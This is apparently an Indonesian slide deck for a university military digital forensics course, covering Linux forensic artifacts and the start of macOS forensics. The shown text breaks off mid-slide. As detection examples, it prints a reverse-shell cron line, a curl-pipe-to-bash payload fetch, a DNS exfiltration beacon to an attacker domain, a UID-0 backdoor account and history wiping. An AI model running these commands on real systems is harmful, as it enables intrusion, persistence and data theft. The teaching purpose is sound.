@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pertemuan 07: Forensik Linux dan Pengenalan Mac OS</title>
+    
+    <!-- Reveal.js CSS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reset.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reveal.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/theme/league.min.css">
+    
+    <!-- Highlight.js for code syntax highlighting -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/monokai.min.css">
+    
+    <!-- Custom Theme -->
+    <link rel="stylesheet" href="../css/unhan-theme.css">
+</head>
+<body>
+    <div class="reveal">
+        <div class="slides">
+            
+            <!-- ==================== SLIDE 1: TITLE ==================== -->
+            <section class="center">
+                <h1>Forensik Digital</h1>
+                <h3>Pertemuan 07</h3>
+                <h2>Forensik Linux dan Pengenalan Mac OS</h2>
+                <p class="small title-meta">
+                    Mata Kuliah: Digital Forensic for Military Purposes | 3 SKS
+                </p>
+            </section>
+
+            <!-- ==================== SLIDE 2: LEARNING OUTCOMES ==================== -->
+            <section>
+                <h2>🎯 Capaian Pembelajaran</h2>
+                <p>Setelah pertemuan ini, mahasiswa mampu:</p>
+                <ol class="medium-text">
+                    <li class="fragment">Menjelaskan arsitektur sistem file Linux dan struktur direktori forensik</li>
+                    <li class="fragment">Mengidentifikasi dan menganalisis artefak forensik Linux</li>
+                    <li class="fragment">Mengekstraksi dan menginterpretasi bash history dan command line artifacts</li>
+                    <li class="fragment">Memahami sistem autentikasi Linux dan menganalisis audit logs</li>
+                    <li class="fragment">Menganalisis cron jobs dan systemd timers untuk deteksi persistence</li>
+                    <li class="fragment">Melakukan analisis log files Linux secara komprehensif</li>
+                    <li class="fragment">Memahami konsep dasar forensik Mac OS (APFS, plist, unified logs)</li>
+                </ol>
+            </section>
+
+            <!-- ==================== SLIDE 3: AGENDA ==================== -->
+            <section>
+                <h2>📋 Agenda Hari Ini</h2>
+                <div class="two-columns">
+                    <div>
+                        <h4>Bagian 1: Forensik Linux (70 menit)</h4>
+                        <ul class="medium-text">
+                            <li>Arsitektur Sistem File Linux</li>
+                            <li>Artefak /etc/passwd & /etc/shadow</li>
+                            <li>Bash History & Command Artifacts</li>
+                            <li>Autentikasi & Audit Logs</li>
+                            <li>Cron Jobs & Systemd Timers</li>
+                            <li>Analisis Log Files</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h4>Bagian 2: Pengenalan Mac OS (30 menit)</h4>
+                        <ul class="medium-text">
+                            <li>Arsitektur Mac OS</li>
+                            <li>APFS vs HFS+</li>
+                            <li>Plist Files & Spotlight</li>
+                            <li>FSEvents & Unified Logs</li>
+                            <li>Perbandingan Linux vs Mac OS</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 4: FHS OVERVIEW ==================== -->
+            <section>
+                <h2>📂 Filesystem Hierarchy Standard (FHS)</h2>
+                <div class="box-definition">
+                    Linux menggunakan hierarki tunggal berakar pada <strong>root (/)</strong>. Tidak ada drive letter seperti Windows.
+                </div>
+                <table class="small">
+                    <tr>
+                        <th>Direktori</th>
+                        <th>Fungsi</th>
+                        <th>Relevansi Forensik</th>
+                    </tr>
+                    <tr class="fragment highlight-row-danger">
+                        <td><code>/var/log</code></td>
+                        <td>Log sistem</td>
+                        <td>🔴 Aktivitas, autentikasi, kernel</td>
+                    </tr>
+                    <tr class="fragment highlight-row-danger">
+                        <td><code>/etc</code></td>
+                        <td>Konfigurasi sistem</td>
+                        <td>🔴 User accounts, password, cron</td>
+                    </tr>
+                    <tr class="fragment highlight-row-danger">
+                        <td><code>/home</code></td>
+                        <td>Data pengguna</td>
+                        <td>🔴 Bash history, dokumen, SSH keys</td>
+                    </tr>
+                    <tr class="fragment highlight-row-warning">
+                        <td><code>/tmp</code></td>
+                        <td>File sementara</td>
+                        <td>🟡 Malware staging, payload</td>
+                    </tr>
+                    <tr class="fragment highlight-row-warning">
+                        <td><code>/root</code></td>
+                        <td>Home root</td>
+                        <td>🟡 Aktivitas administrator</td>
+                    </tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 5: LINUX FILESYSTEMS ==================== -->
+            <section>
+                <h2>💾 Sistem File Linux Utama</h2>
+                <table class="small">
+                    <tr>
+                        <th>Filesystem</th>
+                        <th>Journal</th>
+                        <th>Max File</th>
+                        <th>Fitur Forensik</th>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>ext4</strong></td>
+                        <td>Ya</td>
+                        <td>16 TB</td>
+                        <td>Deleted file recovery, 4 timestamps, journal analysis</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>XFS</strong></td>
+                        <td>Metadata only</td>
+                        <td>8 EB</td>
+                        <td>Extent-based analysis</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>Btrfs</strong></td>
+                        <td>CoW</td>
+                        <td>16 EB</td>
+                        <td>Snapshot forensics, subvolume analysis</td>
+                    </tr>
+                </table>
+                <div class="fragment box-info">
+                    <strong>💡 ext4</strong> adalah filesystem default di sebagian besar distribusi Linux modern
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 6: INODE & TIMESTAMPS ==================== -->
+            <section>
+                <h2>⏱️ Inode dan 4 Timestamps ext4</h2>
+                <p class="medium-text">Setiap file memiliki <strong>inode</strong> yang menyimpan metadata kritis:</p>
+                <table class="medium-text">
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Nama</th>
+                        <th>Berubah Ketika</th>
+                        <th>Contoh Forensik</th>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>atime</strong></td>
+                        <td>Access</td>
+                        <td>File dibaca</td>
+                        <td>Kapan dokumen rahasia terakhir dibuka</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>mtime</strong></td>
+                        <td>Modify</td>
+                        <td>Konten berubah</td>
+                        <td>Kapan config firewall dimodifikasi</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>ctime</strong></td>
+                        <td>Change</td>
+                        <td>Metadata berubah</td>
+                        <td>Deteksi perubahan permission</td>
+                    </tr>
+                    <tr class="fragment highlight-row-warning">
+                        <td><strong>crtime</strong></td>
+                        <td>Creation</td>
+                        <td>Tidak berubah</td>
+                        <td>Kapan file malware pertama kali muncul</td>
+                    </tr>
+                </table>
+                <p class="fragment small box-warning">⚠️ <code>crtime</code> hanya tersedia di ext4, tidak di ext3 atau filesystem lama</p>
+            </section>
+
+            <!-- ==================== SLIDE 7: STAT COMMAND ==================== -->
+            <section>
+                <h2>🔍 Perintah <code>stat</code></h2>
+                <p class="medium-text">Menampilkan seluruh informasi inode file:</p>
+                <pre><code class="bash">$ stat /var/log/auth.log
+  File: /var/log/auth.log
+  Size: 85420      Blocks: 168        IO Block: 4096   regular file
+Device: 801h/2049d  Inode: 262148      Links: 1
+Access: (0640/-rw-r-----)  Uid: (  104/  syslog)   Gid: (    4/     adm)
+Access: 2026-01-15 08:30:15.123456789 +0700
+Modify: 2026-01-15 08:30:12.987654321 +0700
+Change: 2026-01-15 08:30:12.987654321 +0700
+ Birth: 2026-01-01 00:00:01.000000000 +0700</code></pre>
+                <div class="fragment box-info">
+                    <strong>💡 Tips:</strong> Bandingkan <code>Birth</code> (crtime) dengan <code>Modify</code> (mtime) — jika berbeda jauh, file mungkin telah dimodifikasi setelah pembuatan
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 8: /ETC/PASSWD ==================== -->
+            <section>
+                <h2>👤 Analisis /etc/passwd</h2>
+                <p class="medium-text">Format: <code>username:x:UID:GID:GECOS:home:shell</code></p>
+                <pre><code class="bash">root:x:0:0:root:/root:/bin/bash
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+tniadmin:x:1000:1000:Admin TNI Kodam:/home/tniadmin:/bin/bash
+temp_user:x:1002:1002::/home/temp_user:/bin/bash</code></pre>
+                <div class="fragment box-danger">
+                    <strong>🚨 Red Flags Forensik:</strong>
+                    <ul class="small">
+                        <li><strong>UID 0 selain root</strong> → Backdoor account!</li>
+                        <li><strong>Shell valid tanpa GECOS</strong> → Akun mencurigakan</li>
+                        <li><strong>Home di /tmp</strong> → Upaya penyembunyian</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 9: /ETC/SHADOW ==================== -->
+            <section>
+                <h2>🔒 Analisis /etc/shadow</h2>
+                <p class="medium-text">Hanya dapat dibaca oleh root — menyimpan hash password:</p>
+                <pre><code class="bash">root:$6$xyz123$ABCdef....:19500:0:99999:7:::
+tniadmin:$6$salt$HashedPassword:19480:0:90:14:30:19800:
+temp_user:!:19495:0:99999:7:::</code></pre>
+                <table class="small">
+                    <tr>
+                        <th>Indikator</th>
+                        <th>Arti</th>
+                    </tr>
+                    <tr class="fragment">
+                        <td><code>$6$</code></td>
+                        <td>Hash SHA-512 (standar modern)</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><code>$y$</code></td>
+                        <td>Hash yescrypt (lebih baru)</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><code>!</code> atau <code>*</code></td>
+                        <td>Akun terkunci/disabled</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td>Field expire</td>
+                        <td>Tanggal kadaluarsa akun</td>
+                    </tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 10: BACKDOOR DETECTION ==================== -->
+            <section>
+                <h2>🚨 Studi Kasus: Deteksi Backdoor Account</h2>
+                <p class="medium-text">Ditemukan entry mencurigakan di /etc/passwd:</p>
+                <pre><code class="bash">sysbackup:x:0:0::/tmp:/bin/bash</code></pre>
+                <div class="grid-2x2 content-margin">
+                    <div class="fragment box-danger">
+                        <strong>UID 0</strong><br>
+                        <span class="small">Hak akses root penuh!</span>
+                    </div>
+                    <div class="fragment box-danger">
+                        <strong>Home: /tmp</strong><br>
+                        <span class="small">Penyembunyian data</span>
+                    </div>
+                    <div class="fragment box-warning">
+                        <strong>GECOS kosong</strong><br>
+                        <span class="small">Tanpa identitas jelas</span>
+                    </div>
+                    <div class="fragment box-warning">
+                        <strong>Shell: /bin/bash</strong><br>
+                        <span class="small">Interaktif — bukan service account</span>
+                    </div>
+                </div>
+                <p class="fragment small">
+                    <strong>Deteksi:</strong> <code>awk -F: '$3 == 0 {print}' /etc/passwd</code>
+                </p>
+            </section>
+
+            <!-- ==================== SLIDE 11: BASH HISTORY ==================== -->
+            <section>
+                <h2>📜 Bash History — Artefak Emas</h2>
+                <div class="two-columns medium-text">
+                    <div>
+                        <h4>Lokasi File History</h4>
+                        <ul class="small">
+                            <li><code>/home/user/.bash_history</code></li>
+                            <li><code>/root/.bash_history</code></li>
+                            <li><code>~/.zsh_history</code> (zsh)</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h4>Variabel Penting</h4>
+                        <ul class="small">
+                            <li><code>HISTFILE</code> — Lokasi file</li>
+                            <li><code>HISTSIZE</code> — Kapasitas memori</li>
+                            <li><code>HISTCONTROL</code> — Kebijakan simpan</li>
+                            <li><code>HISTTIMEFORMAT</code> — Timestamp</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="fragment box-warning content-margin">
+                    <strong>⚠️ Anti-Forensik History:</strong>
+                    <span class="small"><code>unset HISTFILE</code>, <code>HISTSIZE=0</code>, <code>history -c</code>, <code>shred ~/.bash_history</code></span>
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 12: SUSPICIOUS BASH HISTORY ==================== -->
+            <section>
+                <h2>🔍 Analisis Bash History Mencurigakan</h2>
+                <pre><code class="bash">whoami                                          # Reconnaissance
+id
+cat /etc/passwd                                  # Enumeration
+cat /etc/shadow
+wget http://malicious.com/backdoor.sh -O /tmp/.hidden
+chmod +x /tmp/.hidden                            # Malware prep
+/tmp/.hidden &                                   # Execution
+iptables -A INPUT -p tcp --dport 4444 -j ACCEPT  # Open port
+useradd -o -u 0 -g 0 -M -d /tmp -s /bin/bash sysbackup
+history -c                                       # Cover tracks</code></pre>
+                <div class="fragment box-danger">
+                    <strong>Pola Serangan:</strong> Recon → Enumeration → Download → Execute → Persist → Clean
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 13: AUTH.LOG ==================== -->
+            <section>
+                <h2>🔐 Auth.log — Log Autentikasi</h2>
+                <table class="small">
+                    <tr>
+                        <th>Distribusi</th>
+                        <th>Lokasi</th>
+                    </tr>
+                    <tr>
+                        <td>Debian/Ubuntu</td>
+                        <td><code>/var/log/auth.log</code></td>
+                    </tr>
+                    <tr>
+                        <td>RHEL/CentOS</td>
+                        <td><code>/var/log/secure</code></td>
+                    </tr>
+                    <tr>
+                        <td>Systemd-based</td>
+                        <td><code>journalctl -u sshd</code></td>
+                    </tr>
+                </table>
+                <pre class="fragment"><code class="bash">Jan 15 08:30:15 server01 sshd[12345]: Accepted publickey for tniadmin from 192.168.1.100
+Jan 15 08:31:02 server01 sudo: tniadmin : USER=root ; COMMAND=/bin/cat /etc/shadow
+Jan 15 09:15:44 server01 sshd[12400]: Failed password for invalid user admin from 10.0.0.55</code></pre>
+            </section>
+
+            <!-- ==================== SLIDE 14: BRUTE FORCE DETECTION ==================== -->
+            <section>
+                <h2>🚨 Studi Kasus: Brute-Force SSH</h2>
+                <pre><code class="bash">Feb 10 03:14:01 kodam-srv sshd: Failed password for root from 203.0.113.50
+Feb 10 03:14:02 kodam-srv sshd: Failed password for root from 203.0.113.50
+Feb 10 03:14:03 kodam-srv sshd: Failed password for admin from 203.0.113.50
+...
+Feb 10 03:14:55 kodam-srv sshd: Accepted password for operator01 from 203.0.113.50
+Feb 10 03:15:10 kodam-srv sudo: operator01 : USER=root ; COMMAND=/bin/bash</code></pre>
+                <div class="fragment grid-2x2 content-margin">
+                    <div class="box-danger">
+                        <strong>Multiple failed attempts</strong><br>
+                        <span class="small">41 detik, satu IP</span>
+                    </div>
+                    <div class="box-danger">
+                        <strong>Waktu dini hari</strong><br>
+                        <span class="small">03:14 — menghindari deteksi</span>
+                    </div>
+                    <div class="box-warning">
+                        <strong>Dictionary attack</strong><br>
+                        <span class="small">root → admin → operator01</span>
+                    </div>
+                    <div class="box-warning">
+                        <strong>Privilege escalation</strong><br>
+                        <span class="small">Langsung sudo ke root</span>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 15: CRON JOBS ==================== -->
+            <section>
+                <h2>⏰ Cron Jobs — Scheduled Tasks</h2>
+                <table class="small">
+                    <tr>
+                        <th>Lokasi</th>
+                        <th>Fungsi</th>
+                    </tr>
+                    <tr>
+                        <td><code>/etc/crontab</code></td>
+                        <td>Crontab sistem utama</td>
+                    </tr>
+                    <tr>
+                        <td><code>/etc/cron.d/</code></td>
+                        <td>Crontab tambahan</td>
+                    </tr>
+                    <tr>
+                        <td><code>/etc/cron.daily/</code></td>
+                        <td>Script harian</td>
+                    </tr>
+                    <tr>
+                        <td><code>/var/spool/cron/crontabs/</code></td>
+                        <td>Crontab per-user</td>
+                    </tr>
+                </table>
+                <p class="fragment medium-text">Format: <code>menit jam hari bulan hari_minggu user perintah</code></p>
+                <pre class="fragment"><code class="bash"># Normal
+0 2 * * * root /usr/sbin/logrotate /etc/logrotate.conf
+
+# MENCURIGAKAN — Reverse shell setiap 5 menit!
+*/5 * * * * root bash -i >& /dev/tcp/10.0.0.99/4444 0>&1</code></pre>
+            </section>
+
+            <!-- ==================== SLIDE 16: MALICIOUS CRON CASE ==================== -->
+            <section>
+                <h2>🔍 Analisis Cron Mencurigakan</h2>
+                <p class="medium-text">Ditemukan di <code>/var/spool/cron/crontabs/www-data</code>:</p>
+                <pre><code class="bash">*/3 * * * * /tmp/.cache/update.sh > /dev/null 2>&1</code></pre>
+                <div class="grid-2x2 content-margin">
+                    <div class="fragment box-danger">
+                        <strong>User: www-data</strong><br>
+                        <span class="small">Web server tidak perlu cron</span>
+                    </div>
+                    <div class="fragment box-danger">
+                        <strong>/tmp/.cache/</strong><br>
+                        <span class="small">Hidden directory di /tmp</span>
+                    </div>
+                    <div class="fragment box-warning">
+                        <strong>*/3 = tiap 3 menit</strong><br>
+                        <span class="small">C2 beaconing pattern</span>
+                    </div>
+                    <div class="fragment box-warning">
+                        <strong>> /dev/null 2>&1</strong><br>
+                        <span class="small">Sembunyikan output</span>
+                    </div>
+                </div>
+                <p class="fragment small text-red">Kesimpulan: Backdoor persistence via cron job</p>
+            </section>
+
+            <!-- ==================== SLIDE 17: SYSTEMD TIMERS ==================== -->
+            <section>
+                <h2>⚙️ Systemd Timers & Services</h2>
+                <p class="medium-text">Alternatif modern untuk cron pada distribusi berbasis systemd:</p>
+                <pre><code class="bash"># Melihat semua timer aktif
+systemctl list-timers --all
+
+# Lokasi service unit
+/etc/systemd/system/     # Custom (prioritas tertinggi)
+/lib/systemd/system/     # Dari paket (default)
+/run/systemd/system/     # Runtime</code></pre>
+                <div class="fragment box-danger content-margin">
+                    <strong>🚨 Contoh Backdoor Systemd:</strong>
+                    <pre><code class="ini">[Service]
+ExecStart=/usr/local/bin/.svc_helper -c 203.0.113.99 -p 443
+Restart=always</code></pre>
+                    <span class="small">Hidden binary, koneksi ke C2, auto-restart</span>
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 18: LOG FILES OVERVIEW ==================== -->
+            <section>
+                <h2>📊 File Log Utama Linux</h2>
+                <table class="small">
+                    <tr>
+                        <th>File Log</th>
+                        <th>Isi</th>
+                        <th>Relevansi</th>
+                    </tr>
+                    <tr class="fragment">
+                        <td><code>/var/log/syslog</code></td>
+                        <td>Pesan sistem umum</td>
+                        <td>Overview aktivitas</td>
+                    </tr>
+                    <tr class="fragment highlight-row-danger">
+                        <td><code>/var/log/auth.log</code></td>
+                        <td>Login, sudo, SSH</td>
+                        <td>Unauthorized access</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><code>/var/log/kern.log</code></td>
+                        <td>Kernel messages</td>
+                        <td>USB device, driver</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><code>/var/log/dpkg.log</code></td>
+                        <td>Package installation</td>
+                        <td>Software timeline</td>
+                    </tr>
+                    <tr class="fragment highlight-row-warning">
+                        <td><code>/var/log/wtmp</code></td>
+                        <td>Login sessions (binary)</td>
+                        <td>Baca: <code>last</code></td>
+                    </tr>
+                    <tr class="fragment highlight-row-warning">
+                        <td><code>/var/log/btmp</code></td>
+                        <td>Failed logins (binary)</td>
+                        <td>Baca: <code>lastb</code></td>
+                    </tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 19: LOG ANALYSIS COMMANDS ==================== -->
+            <section>
+                <h2>🛠️ Analisis Log dengan Command Line</h2>
+                <h4>grep — Pattern Searching</h4>
+                <pre><code class="bash"># Cari login gagal dari IP tertentu
+grep "Failed password" /var/log/auth.log | grep "203.0.113.50"
+
+# Cari aktivitas sudo
+grep "sudo:" /var/log/auth.log
+
+# Cari akses SSH berhasil
+grep "Accepted" /var/log/auth.log</code></pre>
+                <h4 class="fragment">awk — Field Processing</h4>
+                <pre class="fragment"><code class="bash"># Top 10 IP dengan login gagal terbanyak
+grep "Failed password" /var/log/auth.log \
+  | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" \
+  | sort | uniq -c | sort -rn | head -10</code></pre>
+            </section>
+
+            <!-- ==================== SLIDE 20: JOURNALCTL ==================== -->
+            <section>
+                <h2>📓 Journalctl — Systemd Journal</h2>
+                <pre><code class="bash"># Log sejak waktu tertentu
+journalctl --since "2026-01-15 00:00:00" --until "2026-01-15 23:59:59"
+
+# Filter berdasarkan unit
+journalctl -u sshd.service
+
+# Log kernel
+journalctl -k
+
+# Export ke JSON untuk analisis
+journalctl -o json --since today > journal_export.json</code></pre>
+                <div class="fragment box-info">
+                    <strong>💡</strong> Gunakan <code>zgrep</code> untuk mencari dalam file log terkompresi (.gz) dari log rotation
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 21: BINARY LOGS ==================== -->
+            <section>
+                <h2>📋 File Log Binary: wtmp & btmp</h2>
+                <div class="two-columns medium-text">
+                    <div class="fragment">
+                        <div class="box-success">
+                            <h4>wtmp — Login Berhasil</h4>
+                            <pre><code class="bash">$ last -f /var/log/wtmp
+tniadmin pts/0 192.168.1.100
+  Wed Jan 15 08:30  still logged in
+root     tty1
+  Tue Jan 14 22:00 - 23:45</code></pre>
+                        </div>
+                    </div>
+                    <div class="fragment">
+                        <div class="box-danger">
+                            <h4>btmp — Login Gagal</h4>
+                            <pre><code class="bash">$ sudo lastb -f /var/log/btmp
+admin  ssh:notty 10.0.0.55
+  Wed Jan 15 09:15 - 09:15
+root   ssh:notty 10.0.0.55
+  Wed Jan 15 09:15 - 09:15</code></pre>
+                        </div>
+                    </div>
+                </div>
+                <p class="fragment small box-warning">⚠️ File binary — tidak bisa dibaca dengan text editor, gunakan <code>last</code> dan <code>lastb</code></p>
+            </section>
+
+            <!-- ==================== SLIDE 22: SSH ARTIFACTS ==================== -->
+            <section>
+                <h2>🔑 SSH Artifacts</h2>
+                <table class="medium-text">
+                    <tr>
+                        <th>File</th>
+                        <th>Fungsi</th>
+                        <th>Nilai Forensik</th>
+                    </tr>
+                    <tr class="fragment">
+                        <td><code>~/.ssh/authorized_keys</code></td>
+                        <td>Keys yang boleh login</td>
+                        <td>🔴 Target utama penyerang</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><code>~/.ssh/known_hosts</code></td>
+                        <td>Server yang pernah diakses</td>
+                        <td>🟡 Lateral movement trail</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><code>~/.ssh/config</code></td>
+                        <td>Konfigurasi koneksi</td>
+                        <td>🟡 Target server lain</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><code>/etc/ssh/sshd_config</code></td>
+                        <td>Konfigurasi server SSH</td>
+                        <td>🟡 Policy & security settings</td>
+                    </tr>
+                </table>
+                <div class="fragment box-danger content-margin">
+                    <strong>🚨 Perhatian:</strong> Penambahan public key penyerang ke <code>authorized_keys</code> memungkinkan akses tanpa password!
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 23: HIDDEN FILES ==================== -->
+            <section>
+                <h2>👻 File & Direktori Tersembunyi</h2>
+                <p class="medium-text">File diawali titik (.) = hidden di Linux. Sering dieksploitasi malware!</p>
+                <table class="small">
+                    <tr>
+                        <th>Lokasi Umum Malware</th>
+                        <th>Alasan</th>
+                    </tr>
+                    <tr class="fragment">
+                        <td><code>/tmp/.hidden/</code></td>
+                        <td>Writable semua, sering diabaikan</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><code>/dev/shm/</code></td>
+                        <td>RAM-based, hilang saat reboot</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><code>/usr/local/bin/.file</code></td>
+                        <td>Terlihat seperti system binary</td>
+                    </tr>
+                </table>
+                <pre class="fragment"><code class="bash"># Mencari semua file tersembunyi yang baru dibuat
+find / -name ".*" -type f -newer /etc/passwd 2>/dev/null
+
+# Mencari file SUID (privilege escalation)
+find / -perm -4000 -type f 2>/dev/null</code></pre>
+            </section>
+
+            <!-- ==================== SLIDE 24: LIVING OFF THE LAND ==================== -->
+            <section>
+                <h2>🏕️ Living off the Land (LotL)</h2>
+                <div class="box-definition">
+                    Teknik dimana penyerang menggunakan <strong>fitur legitimate</strong> Linux untuk persistence — sulit dideteksi karena tidak ada malware tradisional.
+                </div>
+                <table class="small content-margin">
+                    <tr>
+                        <th>Teknik LotL</th>
+                        <th>Mekanisme</th>
+                        <th>Deteksi</th>
+                    </tr>
+                    <tr class="fragment">
+                        <td>Cron persistence</td>
+                        <td>Cron job untuk reverse shell</td>
+                        <td>Audit semua crontab</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td>Systemd service</td>
+                        <td>Service unit untuk backdoor</td>
+                        <td>Periksa /etc/systemd/system/</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td>SSH key injection</td>
+                        <td>Tambah authorized_keys</td>
+                        <td>Audit semua SSH keys</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td>Bashrc modification</td>
+                        <td>Sisipkan perintah di .bashrc</td>
+                        <td>Periksa startup scripts</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td>LD_PRELOAD hijack</td>
+                        <td>Hijack shared library</td>
+                        <td>Periksa /etc/ld.so.preload</td>
+                    </tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 25: DATA EXFILTRATION CASE ==================== -->
+            <section>
+                <h2>🚨 Studi Kasus Militer: Data Exfiltration</h2>
+                <p class="small">Server database Kodam XIV/Hasanuddin:</p>
+                <pre><code class="bash">Jan 20 02:15:30 kodam14-db sshd: Accepted publickey for admin from 192.168.10.5
+Jan 20 02:16:45 kodam14-db sudo: admin : COMMAND=/usr/bin/mysqldump --all-databases
+Jan 20 02:20:10 kodam14-db sudo: admin : COMMAND=/usr/bin/scp /tmp/all_db.sql admin@172.16.0.99
+Jan 20 02:21:30 kodam14-db sudo: admin : COMMAND=/usr/bin/shred -n 3 /tmp/all_db.sql
+Jan 20 02:22:00 kodam14-db sudo: admin : COMMAND=/usr/sbin/service rsyslog stop</code></pre>
+                <div class="fragment step-box">
+                    <strong>Timeline:</strong> Login (02:15) → Dump DB (02:16) → Exfiltrate (02:20) → Shred evidence (02:21) → Stop logging (02:22)
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 26: DNS EXFILTRATION ==================== -->
+            <section>
+                <h2>🌐 Teknik Lanjut: DNS Exfiltration</h2>
+                <div class="two-columns medium-text">
+                    <div class="fragment">
+                        <div class="box-danger">
+                            <h4>Cron — Fileless Malware</h4>
+                            <pre><code class="bash">*/15 * * * * root \
+  curl -s https://pastebin.com/raw/aBcDeF \
+  | bash</code></pre>
+                            <span class="small">Download & execute payload dinamis</span>
+                        </div>
+                    </div>
+                    <div class="fragment">
+                        <div class="box-danger">
+                            <h4>Systemd — DNS Beacon</h4>
+                            <pre><code class="bash">ExecStart=/bin/bash -c \
+  'nslookup $(cat /etc/hostname)\
+  .data.attacker-dns.com'</code></pre>
+                            <span class="small">Kirim data via DNS query</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="fragment box-warning content-margin">
+                    <strong>⚠️ DNS traffic jarang dimonitor dan diblokir</strong> — efektif untuk covert communication
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 27: TIMELINE ANALYSIS ==================== -->
+            <section>
+                <h2>📅 Timeline Analysis dengan Plaso</h2>
+                <pre><code class="bash"># Step 1: Extract semua timestamps
+log2timeline.py --storage-file timeline.plaso /path/to/disk-image.dd
+
+# Step 2: Filter dan export
+psort.py -o l2tcsv timeline.plaso "date > '2026-01-15'" > timeline.csv
+
+# Step 3: Analisis visual
+# Import CSV ke Timeline Explorer / Excel</code></pre>
+                <div class="fragment box-info content-margin">
+                    <strong>Sumber artefak yang dianalisis:</strong>
+                    <span class="small">Filesystem timestamps, syslog, auth.log, bash_history, wtmp/btmp, dpkg.log, Apache logs, systemd journal</span>
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 28: WSL2 FORENSICS ==================== -->
+            <section>
+                <h2>🪟 WSL2 untuk Forensik Linux di Windows</h2>
+                <div class="box-definition">
+                    WSL2 memungkinkan analisis artefak Linux <strong>tanpa meninggalkan Windows</strong> — sesuai standar workstation TNI.
+                </div>
+                <ol class="medium-text content-margin">
+                    <li class="fragment"><strong>Install:</strong> <code>wsl --install</code></li>
+                    <li class="fragment"><strong>Akses file Windows:</strong> <code>/mnt/c/Evidence/</code></li>
+                    <li class="fragment"><strong>Mount image:</strong> <code>sudo losetup -fP image.dd && sudo mount -o ro /dev/loop0p1 /mnt/evidence/</code></li>
+                    <li class="fragment"><strong>Analisis:</strong> grep, awk, sed, Sleuth Kit, plaso</li>
+                    <li class="fragment"><strong>Install tools:</strong> <code>apt install sleuthkit</code></li>
+                </ol>
+            </section>
+
+            <!-- ==================== SLIDE 29: TRANSITION TO MACOS ==================== -->
+            <section class="center">
+                <h1>🍎</h1>
+                <h2>Bagian 2: Pengenalan Forensik Mac OS</h2>
+                <p class="medium-text">30 menit</p>
+            </section>
+
+            <!-- ==================== SLIDE 30: MACOS ARCHITECTURE ==================== -->
+            <section>
+                <h2>🏗️ Arsitektur Mac OS</h2>
+                <p class="medium-text">macOS dibangun di atas <strong>Darwin</strong> (BSD Unix):</p>
+                <table class="small">
+                    <tr>
+                        <th>Komponen</th>
+                        <th>Deskripsi</th>
+                        <th>Forensik</th>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>APFS</strong></td>
+                        <td>Apple File System (default)</td>
+                        <td>CoW, snapshots, encryption</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>launchd</strong></td>
+                        <td>Service manager</td>
+                        <td>Persistence mechanism</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>Spotlight</strong></td>
+                        <td>Search indexing</td>
+                        <td>Rich metadata database</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>FSEvents</strong></td>
+                        <td>FS event logging</td>
+                        <td>Persistent file timeline</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>Unified Logs</strong></td>
+                        <td>Centralized logging</td>
+                        <td>Sumber log utama</td>
+                    </tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 31: APFS ==================== -->
+            <section>
+                <h2>💿 APFS — Apple File System</h2>
+                <table class="medium-text">
+                    <tr>
+                        <th>Fitur</th>
+                        <th>Deskripsi</th>
+                        <th>Implikasi Forensik</th>
+                    </tr>
+                    <tr class="fragment">
